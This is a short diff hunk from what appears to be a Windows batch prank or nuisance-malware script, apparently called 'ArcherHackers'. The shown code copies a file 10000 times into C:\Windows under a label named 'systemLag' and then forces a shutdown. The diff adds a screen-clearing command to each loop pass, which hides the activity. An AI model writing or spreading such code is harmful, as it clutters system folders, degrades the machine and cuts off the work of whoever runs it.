@@ -66,6 +66,7 @@ set /a cr=0
 :systemLag
 copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\ArcherHackers\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
+cls
 if not %cr%==10000 goto systemLag
 
 shutdown /s /t 10
